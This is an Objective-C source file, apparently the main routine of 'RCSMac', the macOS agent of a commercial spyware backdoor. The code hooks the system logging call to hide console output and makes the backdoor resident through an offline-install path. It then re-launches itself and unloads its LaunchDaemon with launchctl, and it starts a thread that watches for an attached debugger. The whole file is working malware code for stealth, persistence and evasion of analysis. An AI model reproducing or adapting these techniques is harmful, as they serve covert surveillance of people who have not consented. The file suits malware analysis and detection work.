/*
 * RCSMac
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 23/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#import "RCSMCore.h"
#import "RCSMCommon.h"
#import "mach_override.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "NSMutableData+SHA1.h"

extern void lionSendEventToPid(pid_t pid);

#ifndef ENABLE_LOGGING
#include <asl.h>
// Do not log anything in the console
static int _hook_asl_send(aslclient client, aslmsg msg)
{
  return 1;
}
int (*asl_send_reentry)(aslclient,aslmsg);
#endif

int main (int argc, const char *argv[])
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 
#ifdef ENABLE_LOGGING
  [RCSMLogger setComponent: @"core"];
//  infoLog(@"STARTING");
#else
  // suppress every logging in console
  mach_override("_asl_send", "libsystem_c",(void *)&_hook_asl_send, (void **)&asl_send_reentry);
#endif
  
  // FIXED- fixing string binary patched
  gMode[5] = 0;
  gBackdoorID[14] = gBackdoorID[15] = 0;
  
  // Fix for lion: AppleEvents only from unhidden proc
  if (argc > 1) 
    {
      if (argv[1] &&
          (strncmp(argv[1], "-p", strlen("-p")) == 0)) 
        {
          pid_t pid = atoi(argv[2]);

          lionSendEventToPid(pid);

          [pool release];
          exit(0);
        }
    }
  
  NSString *offlineFlagPath = [[NSString alloc] initWithFormat: @"%@/off.flg",
                               [[NSBundle mainBundle] bundlePath]];
  
  gUtil = [RCSMUtils sharedInstance];
  RCSMCore *core = [[RCSMCore alloc] init];
  
  //
  // Check if we've been installed by offline cd
  //
  if ([[NSFileManager defaultManager] fileExistsAtPath: offlineFlagPath])
    {
      [[NSFileManager defaultManager] removeItemAtPath: offlineFlagPath
                                                 error: nil];
      
      // Force it
      [core makeBackdoorResident];
      
      //
      // Executing ourself with the new executable name and exit
      //
      [gUtil executeTask: [[NSBundle mainBundle] executablePath]
           withArguments: nil
            waitUntilEnd: NO];
      
      //
      // Remove the LaunchDaemon plist
      //
      NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
                                 [[[[[NSBundle mainBundle] bundlePath]
                                    stringByDeletingLastPathComponent]
                                   stringByDeletingLastPathComponent]
                                  stringByDeletingLastPathComponent],
                                 BACKDOOR_DAEMON_PLIST ];
      
      //
      // Unload our service from LaunchDaemon
      //
      NSArray *_commArguments = [[NSArray alloc] initWithObjects:
                                 @"remove",
                                 [[backdoorPlist lastPathComponent]
                                  stringByDeletingPathExtension],
                                 nil];
      [gUtil executeTask: @"/bin/launchctl"
           withArguments: _commArguments
            waitUntilEnd: YES];
      
      exit(0);
    }
  
  [offlineFlagPath release];
  
  //
  // Spawn a thread who checks whenever a debugger is attaching our app
  //
#ifndef NO_ANTIDEBUGGING
  [NSThread detachNewThreadSelector: @selector(xfrth)
                           toTarget: core
                         withObject: nil];
#endif
  
  [core runMeh];
  [pool drain];
  
  return 0;
}
